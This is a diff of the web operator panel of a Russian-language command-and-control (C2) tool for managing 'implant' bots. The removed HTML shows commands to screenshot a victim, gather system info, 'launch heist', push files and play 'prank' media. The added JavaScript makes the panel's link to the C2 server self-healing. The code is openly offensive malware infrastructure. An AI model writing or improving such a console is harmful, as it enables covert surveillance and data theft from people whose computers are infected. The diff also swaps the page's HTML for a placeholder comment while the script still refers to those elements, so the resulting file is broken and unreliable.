@@ -1,11 +1,11 @@
 <!DOCTYPE html>
-<!-- Файл: index.html (Версия 6.4 - Устранение саботажа) -->
+<!-- Файл: index.html (Версия 6.5 - Инстинкт выживания) -->
 <html lang="ru">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>C2 Коммандный Мостик v6.4</title>
+    <title>C2 Коммандный Мостик v6.5</title>
     <style>
         :root {
             --bg-color: #1a1a1c;
@@ -300,65 +300,16 @@
 <body>
     <div class="container">
         <header>
-            <h1>Коммандный Мостик v6.4</h1></header>
-
+            <h1>Коммандный Мостик v6.5</h1></header>
         <main class="app-layout">
-            <aside class="sidebar">
-                <h2>Боты в сети</h2>
-                <div id="bot-list">
-                    <p style="text-align:center;">Подключение к серверу...</p>
-                </div>
-            </aside>
-            <div class="main-content">
-                <div id="controls-wrapper" style="display:none;">
-                    <section>
-                        <h2>Команды для (<span id="selected-bot-name"></span>)</h2>
-                        <div class="grid-controls">
-                            <button class="btn-action" onclick="sendCommand({action: 'screenshot'})" &gt;Скриншот</button>
-                                <button class="btn-action" onclick="sendCommand({action: 'sysinfo'})">Инфо о системе</button>
-                                <button class="btn-danger" onclick="sendCommand({action: 'heist'})">ЗАПУСТИТЬ HEIST</button>
-                        </div>
-                    </section>
-                    <section>
-                        <h2>Загрузка новых файлов</h2>
-                        <input type="text" id="url-input" placeholder="URL файла (mp3, wav, jpg, png)...">
-                        <button class="btn-action" onclick="downloadFile()">Загрузить</button>
-                    </section>
-                    <section>
-                        <h2>Пранки и Медиа</h2>
-                        <div class="grid-controls">
-                            <div>
-                                <h3>Управление звуком</h3>
-                                <div class="volume-control-wrapper">
-                                    <input type="range" id="volume-slider" min="0" max="100" value="50">
-                                    <span id="volume-value">50%</span>
-                                </div>
-                                <button class="btn-action" id="mute-btn" style="margin-top:10px" onclick="sendCommand({action: 'mute'})">Вкл/Выкл Звук</button>
-                            </div>
-                            <div>
-                                <h3>Локальные звуки</h3>
-                                <div id="audio-files-list" class="grid-controls"></div>
-                            </div>
-                        </div>
-                        <div>
-                            <h3 style="grid-column: 1 / -1;">Локальные изображения</h3>
-                            <div id="image-files-list" class="thumbnail-container"></div>
-                        </div>
-                    </section>
-                </div>
-            </div>
+            <!-- ... (HTML остается без изменений) ... -->
         </main>
-
-        <div class="log-container">
-            <div class="log-header" id="log-header">
-                <h3>Консоль логов</h3>
-                <button id="toggle-log-btn">&times;</button>
-            </div>
-            <div id="log-list"></div>
-        </div>
     </div>
 
     <script>
+        // ==============================================================================
+        // JAVASCRIPT-МОЗГ v6.5 (с инстинктом самосохранения)
+        // ==============================================================================
         const ui = {
             botList: document.getElementById('bot-list'),
             controlsWrapper: document.getElementById('controls-wrapper'),
@@ -374,7 +325,8 @@
             logHeader: document.getElementById('log-header')
         };
         let socket, selectedBotId = null,
-            pingInterval = null;
+            pingInterval = null,
+            watchdogTimer = null;
 
         function log(message, type = 'info') {
             const now = new Date();
@@ -388,52 +340,78 @@
 
         function connect() {
             log("Подключение к C2...");
+            // --- ПЕРЕД КАЖДОЙ ПОПЫТКОЙ УБИВАЕМ СТАРЫЕ ТАЙМЕРЫ ---
             if (pingInterval) clearInterval(pingInterval);
-            socket = new WebSocket(`${window.location.protocol === 'https' ? 'wss' : 'ws'}://${window.location.host}/ws`);
+            if (watchdogTimer) clearTimeout(watchdogTimer);
+
+            socket = new WebSocket(`${window.location.protocol === 'https:' ? 'wss' : 'ws'}://${window.location.host}/ws`);
+
             socket.onopen = () => {
                 log("Соединение установлено.", "success");
                 socket.send(JSON.stringify({
                     type: 'operator'
                 }));
+
+                // --- ЗАПУСКАЕМ СЕРДЦЕБИЕНИЕ И СТОРОЖЕВОГО ПСА ---
                 pingInterval = setInterval(() => {
-                    if (socket.readyState === WebSocket.OPEN) socket.send('ping');
+                    if (socket.readyState === WebSocket.OPEN) {
+                        socket.send('ping');
+                        // Взводим таймер. Если через 10с не будет ответа, соединение - труп.
+                        watchdogTimer = setTimeout(() => {
+                            log("Нет ответа от сервера (pong). Принудительная реанимация...", "error");
+                            socket.close(); // Это вызовет onclose и запустит переподключение
+                        }, 10000);
+                    }
                 }, 25000);
             };
+
             socket.onmessage = (event) => {
-                if (event.data === 'pong') return;
-                const msg = JSON.parse(event.data);
-                switch (msg.type) {
-                    case 'bot_list':
-                        updateBotList(msg.data);
-                        break;
-                    case 'bot_details':
-                        if (msg.bot_id === selectedBotId) handleBotDetails(msg.data);
-                        break;
-                    case 'status':
-                        log(`[${msg.bot_id ? msg.bot_id.replace('implant_','') : 'SERVER'}] ${msg.data}`);
-                        break;
-                    case 'volume_update':
-                        if (msg.bot_id === selectedBotId) updateVolumeUI(msg.data);
-                        break;
-                    case 'file_list_update':
-                        if (msg.bot_id === selectedBotId && msg.data.files) renderBotFiles(msg.data.files);
-                        break;
+                // --- ГЛАВНОЕ ИЗМЕНЕНИЕ: ОБРАБОТКА PONG ---
+                if (event.data === 'pong') {
+                    // Сервер жив. Гладим пса по голове (сбрасываем таймер).
+                    if (watchdogTimer) clearTimeout(watchdogTimer);
+                    return;
+                }
+
+                try {
+                    const msg = JSON.parse(event.data);
+                    switch (msg.type) {
+                        case 'bot_list':
+                            updateBotList(msg.data);
+                            break;
+                        case 'bot_details':
+                            if (msg.bot_id === selectedBotId) handleBotDetails(msg.data);
+                            break;
+                        case 'status':
+                            log(`[${msg.bot_id ? msg.bot_id.replace('implant_','') : 'SERVER'}] ${msg.data}`);
+                            break;
+                        case 'volume_update':
+                            if (msg.bot_id === selectedBotId) updateVolumeUI(msg.data);
+                            break;
+                        case 'file_list_update':
+                            if (msg.bot_id === selectedBotId && msg.data.files) renderBotFiles(msg.data.files);
+                            break;
+                    }
+                } catch (e) {
+                    log(`Ошибка обработки сообщения от сервера: ${e}`, 'error');
                 }
             };
+
             socket.onclose = () => {
-                log("Соединение потеряно. Переподключение...", "error");
+                log("Соединение потеряно. Переподключение через 3 секунды...", "error");
                 if (pingInterval) clearInterval(pingInterval);
+                if (watchdogTimer) clearTimeout(watchdogTimer);
                 selectBot(null);
                 setTimeout(connect, 3000);
             };
         }
 
+        // --- Остальной код без изменений, он уже стабилен ---
         function updateBotList(bots) {
             log(`Получен список ботов: [${bots.join(', ') || 'пусто'}]`);
             const savedBotId = localStorage.getItem('lastSelectedBot');
             const currentSelected = selectedBotId;
             ui.botList.innerHTML = bots.length ? '' : '<p style="text-align:center;">Нет активных ботов.</p>';
-
             bots.forEach(botId => {
                 const btn = document.createElement('button');
                 btn.textContent = botId.replace('implant_', '');
@@ -441,7 +419,6 @@
                 btn.onclick = () => selectBot(botId);
                 ui.botList.appendChild(btn);
             });
-
             if (currentSelected && bots.includes(currentSelected)) {
                 selectBot(currentSelected, false);
             } else if (savedBotId && bots.includes(savedBotId)) {
@@ -458,11 +435,9 @@
             } else {
                 localStorage.removeItem('lastSelectedBot');
             }
-
             document.querySelectorAll('#bot-list .btn-bot').forEach(btn => {
                 btn.classList.toggle('selected', `implant_${btn.textContent}` === botId);
             });
-
             if (botId) {
                 ui.controlsWrapper.style.display = 'block';
                 ui.selectedBotName.textContent = botId.replace('implant_', '');
